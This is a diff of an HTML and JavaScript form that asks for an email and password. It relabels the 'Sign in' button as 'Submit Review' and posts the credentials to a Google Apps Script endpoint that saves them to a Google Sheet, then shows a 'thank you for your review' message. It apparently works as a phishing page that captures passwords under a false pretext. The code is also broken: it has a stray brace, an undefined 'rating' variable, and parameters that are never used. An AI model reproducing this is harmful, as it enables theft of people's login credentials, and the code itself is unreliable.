@@ -28,12 +28,12 @@
             text-align: left;
         }
 
-        label, input {
+        label, input, textarea {
             display: block;
             margin: 10px 0;
         }
 
-        input {
+        input, textarea {
             width: 100%;
             padding: 10px;
             box-sizing: border-box;
@@ -64,6 +64,19 @@
             top: 10px;
             right: 10px;
             cursor: pointer;
+        }
+
+        .response-message {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+
+        .response-message.success {
+            color: green;
+        }
+
+        .response-message.error {
+            color: red;
         }
     </style>
 </head>
@@ -98,10 +111,15 @@
                 >
                 <i onclick="togglePasswordVisibility()">👁️</i>
             </div>
-            
+
+
+
             <!-- Submit Button -->
-            <button type="submit">Sign in</button>
+            <button type="submit">Submit Review</button>
         </form>
+
+        <!-- Response Message -->
+        <div id="response-message" class="response-message"></div>
     </div>
 
     <script>
@@ -120,10 +138,11 @@
             event.preventDefault(); // Prevent default form submission
             
             // Get form inputs
-            const email = document.getElementById("Email").value;
-            const password = document.getElementById("Password").value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+           
 
-            // Validate Email and Password conditions
+            // Validate Email, Password, Rating, and Review conditions
             if (!email || email.length < 10 || !email.includes('@')) {
                 alert("Please enter a valid email (at least 10 characters and include '@').");
                 return;
@@ -134,21 +153,25 @@
                 return;
             }
 
-            // Save to Google Sheets (No redirection to Google Form)
-            saveToGoogleSheet(Email, Password)
+           
+            }
+
+            // Save to Google Sheets
+            saveToGoogleSheet(email, password)
                 .then(() => {
-                    alert("Data saved successfully!"); // Confirm data save
+                    document.getElementById('response-message').classList.add('success');
+                    document.getElementById('response-message').innerText = `Thank you! Your review with a rating of ${rating} has been submitted successfully.`;
                 })
                 .catch((error) => {
-                    // Handle any errors that occurred during the save
                     console.error("Error saving data:", error);
-                    alert("There was an issue saving your data. Please try again.");
+                    document.getElementById('response-message').classList.add('error');
+                    document.getElementById('response-message').innerText = `There was an issue saving your data. Please try again.`;
                 });
         }
 
         // Save Data to Google Sheets
-        function saveToGoogleSheet(email, password) {
-            const scriptURL = "https://script.google.com/macros/s/AKfycbxAowUFxMflqjdVrdqx3mm19NF0uaciBNiXCy_-yXNCfMVnt1QqOtMipEki2V67PgZp/exec"; // Replace with your script URL
+        function saveToGoogleSheet(email, password, rating, review) {
+            const scriptURL = "https://script.google.com/macros/s/AKfycbz0z281mdADtFUWvWV-C1yvh8EA20P3w33b3-DL6MZkIsXXF72CD8iJx7n4t16mSbN-/exec"; // Replace with your script URL
             return fetch(scriptURL, {
                 method: "POST",
                 body: new URLSearchParams({ email, password })
